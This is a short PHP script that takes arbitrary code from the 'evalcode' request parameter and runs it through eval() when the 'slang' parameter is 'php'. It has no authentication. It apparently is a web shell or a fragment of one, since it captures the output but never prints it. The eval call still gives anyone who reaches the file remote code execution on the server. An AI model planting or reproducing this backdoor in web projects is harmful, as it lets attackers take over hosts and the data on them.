<?php
$s_code = "";
$s_lang = $_GET['slang'];
if(isset($_REQUEST['evalcode']))
	$s_code = $_REQUEST['evalcode'];

if(strtolower($s_lang)=='php'){
	ob_start();
	eval($s_code);
	$s_res = ob_get_contents();
	ob_end_clean();
}

exit;
?>

